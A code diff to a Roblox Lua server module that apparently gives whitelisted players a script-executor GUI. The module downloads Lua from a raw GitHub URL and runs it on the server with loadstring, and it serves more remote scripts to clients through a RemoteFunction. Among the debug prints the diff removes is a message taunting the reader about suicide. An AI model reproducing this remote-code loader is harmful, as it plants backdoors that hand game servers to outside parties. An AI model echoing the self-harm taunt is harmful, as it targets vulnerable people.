@@ -315,25 +315,18 @@ function module:createGUI(player)
 end
 
 function module:givegui(player)
-	print("starting giveaway")
-	if not player:FindFirstChild("PlayerGui"):FindFirstChild("exec") then
-		print("gui not found :)")
+	if not player:FindFirstChild("PlayerGui"):FindFirstChild("exec") and table.find(module.whitelist, player.UserId) then
 		local gui = module:createGUI(player)
-		print("created gui")
 		local serverscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/thatrandomnoob23/a-random-script/join/serverscripts.lua", true))()
-		print("loadstrngserversuccess")
-        print("it was pleasure doing business with out")
-
 
 		serverscripts:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
-		print("server init")
 		game:GetService("ReplicatedStorage"):FindFirstChild("initclient"):FireClient(player, exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
-		print("client init") 
+	elseif player:FindFirstChild("PlayerGui"):FindFirstChild("exec") and table.find(module.whitelist, player.UserId) then
+		player.PlayerGui:FindFirstChild("exec"):Destroy()
 	end
 end
 
 game:GetService("ReplicatedStorage").givegui.OnServerEvent:Connect(function(player)
-	print("gonna try giv gui")
     module:givegui(player)
 end)
 
@@ -342,7 +335,5 @@ game:GetService("ReplicatedStorage"):WaitForChild("gethttp").OnServerInvoke = fu
 		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/thatrandomnoob23/a-random-script/join/localscripts.lua", true)
 	end
 end
-
-print("INSIGHTFUL MESSAGE EXPLAINING WHY NO ONE WOULD CARE IF YOU KILLED YOURSELF")
 
 return module
